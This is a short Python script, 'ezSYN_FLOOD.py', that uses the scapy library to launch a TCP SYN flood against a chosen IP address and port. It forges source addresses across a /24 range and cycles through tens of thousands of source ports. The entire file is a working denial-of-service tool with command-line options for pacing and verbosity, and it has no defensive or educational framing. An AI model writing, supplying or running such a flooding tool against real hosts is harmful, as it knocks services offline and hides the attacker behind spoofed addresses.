#!/usr/bin/env python3

"""
Usage:
  ezSYN_FLOOD.py <dst_ip> <dst_port> [--sleep=<sec>] [--verbose] [--very-verbose]
Options:
  -h, --help            Show options
  --version             Version
  --sleep=<seconds>     Seconds to sleep between shots [default: 0]
  --verbose             Addresses being spoofed [default: False]
  --very-verbose        Display everything [default: False]
"""
from docopt import docopt
import logging
import signal
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def main(arguments):
    src_net = "192.168.250."
    dst_ip = arguments["<dst_ip>"]
    dst_port = int(arguments["<dst_port>"])
    sleep = int(arguments["--sleep"])
    verbose = arguments["--verbose"]
    very_verbose = arguments["--very-verbose"]

    signal.signal(signal.SIGINT, lambda n, f: sys.exit(0))

    print("\n###########################################")
    print("# Starting SYN TCP flood...")
    print(f"# Shooting at: {dst_ip}")
    print("###########################################\n")
    for src_host in range(1,254):
        if verbose or very_verbose:
            print(f"[*] We are sending spoofed SYN packets from {src_net}{src_host}")
            print("--------------------------------------------")

        for src_port in range(1024, 65535):
            if very_verbose:
                print(f"[+] Sending a spoofed SYN packet from {src_net}{src_host}:{src_port}")

            # Build the packet
            src_ip = src_net + str(src_host)
            network_layer = IP(src=src_ip, dst=dst_ip)
            transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")

            # Send the packet
            send(network_layer/transport_layer, verbose=False)

            if sleep != 0:
                time.sleep(sleep)

    print("[+] Flooding done.")

if __name__ == '__main__':
    arguments = docopt(__doc__, version="ezSYN_FLOOD v1.0")
    main(arguments)
